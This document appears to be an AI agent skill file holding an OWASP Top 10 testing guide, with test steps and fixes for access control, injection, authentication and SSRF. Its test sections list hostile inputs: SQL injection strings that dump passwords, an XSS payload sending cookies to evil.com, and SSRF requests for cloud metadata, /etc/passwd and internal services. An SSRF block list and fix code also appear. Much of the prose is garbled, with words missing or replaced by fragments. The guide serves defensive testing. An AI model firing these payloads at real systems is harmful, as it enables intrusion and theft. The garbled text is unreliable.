---
name: owasp-testing-guide
description: "OWASP Top 10  security test methodology, vulnerabilityper attack , detection , modification guide. 'OWASP', 'Top 10', 'XSS', 'SQL Injection', 'CSRF', 'SSRF', 'Injection', 'security test methodology', 'vulnerability test' etc.  this security test  this  for. code-analystand pentest-reporterof security analysis  -ize. , actual penetration test executionthis network  this of scope ."
---

# OWASP Testing Guide — OWASP Top 10 security test guide

OWASP Top 10 (2021) criteria vulnerabilityper detection/test/modification methodology.

## OWASP Top 10 (2021) mapping

|  | category | CWE example | severity |
|------|---------|---------|--------|
| A01 | Broken Access Control | CWE-200, CWE-352 | Critical |
| A02 | Cryptographic Failures | CWE-259, CWE-327 | High |
| A03 | Injection | CWE-79, CWE-89 | Critical |
| A04 | Insecure Design | CWE-209, CWE-256 | High |
| A05 | Security Misconfiguration | CWE-16, CWE-611 | Medium~High |
| A06 | Vulnerable Components | CWE-1035 | High |
| A07 | Auth Failures | CWE-287, CWE-384 | Critical |
| A08 | Data Integrity Failures | CWE-502 | High |
| A09 | Logging Failures | CWE-778 | Medium |
| A10 | SSRF | CWE-918 | High |

## A01: Broken Access Control

### test 
```
1. IDOR (Insecure Direct Object Reference)
   GET /api/users/123/profile → 200 ()
   GET /api/users/456/profile → 200 () → !

2. permission upper
   day user tokenas administrator API :
   POST /api/admin/users (day token) → 403this 

3. count-based permission this
   user A tokenas user B resource modification:
   PUT /api/orders/B_ORDER_ID (A token) → 403this 
```

### modification guide
```python
# Before ()
@app.get("/api/users/{user_id}")
def get_user(user_id: int):
    return db.query(User).filter(User.id == user_id).first()

# After (modification)
@app.get("/api/users/{user_id}")
def get_user(user_id: int, current_user: User = Depends(get_current_user)):
    if user_id != current_user.id and not current_user.is_admin:
        raise HTTPException(403)
    return db.query(User).filter(User.id == user_id).first()
```

## A03: Injection

### SQL Injection test

```
 thisas:
├── default: ' OR '1'='1
├── UNION: ' UNION SELECT username,password FROM users --
├── between : ' AND SLEEP(5) --
├── error: ' AND 1=CONVERT(int,(SELECT @@version)) --
└── 2 insert: admin'--  (membersignup  , log  tree)
```

### XSS (Cross-Site Scripting) test

```
Reflected XSS:
  /search?q=<script>alert(1)</script>
  /search?q=<img src=x onerror=alert(1)>

Stored XSS:
  comment/reviewin <script>document.location='evil.com?c='+document.cookie</script>

DOM-based XSS:
  #<img src=x onerror=alert(1)> (fragment )
```

### modification principle

| vulnerability | modification | framework supported |
|--------|------|---------------|
| SQL Injection | parameter-ize query | ORM for, raw SQL prohibited |
| XSS |   | React JSX automatic thisthis, DOMPurify |
| Command Injection | -izethislist verification | subprocess  shell=False |
| LDAP Injection | parameter  | library within thisthis |

## A07: Authentication Failures

### test item

```
1. root 
   identical account 10 failure → account lock or count backoff?

2. password policy
   "password" allowed? minimum this? complexalso?

3. session 
   log after thisbefore token valid? (session invalid-ize)
   token only between -based?

4. JWT verification
   alg: none attack allowed?
    key also?
   token thisasin  information?

5. MFA 
   MFA phase cases possible?
   backup code root possible?
```

## A10: SSRF (Server-Side Request Forgery)

### test thisas
```
internal network :
  url=http://169.254.169.254/latest/meta-data/  (AWS data)
  url=http://localhost:6379/  (internal Redis)
  url=http://10.0.0.1/admin  (internal  )

as type:
  url=file:///etc/passwd
  url=gopher://127.0.0.1:25/
  url=dict://127.0.0.1:6379/info
```

### modification
```python
# SSRF : URL -izethislist + internal IP 
BLOCKED_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
]

def is_safe_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        return False
    ip = socket.gethostbyname(parsed.hostname)
    for blocked in BLOCKED_RANGES:
        if ipaddress.ip_address(ip) in blocked:
            return False
    return True
```

## security  list

|  | value | -based |
|------|-------|------|
| Content-Security-Policy | script-src 'self' | XSS  |
| X-Content-Type-Options | nosniff | MIME   |
| X-Frame-Options | DENY |   |
| Strict-Transport-Security | max-age=31536000; includeSubDomains | HTTPS  |
| X-XSS-Protection | 0 (CSP for ) |  XSS filter |
| Referrer-Policy | strict-origin-when-cross-origin |    |

## CVSS severity etc.

| etc. | count |   |
|------|------|----------|
| Critical | 9.0~10.0 | 24between within |
| High | 7.0~8.9 | 1week within |
| Medium | 4.0~6.9 | 1itemsmonth within |
| Low | 0.1~3.9 |   |
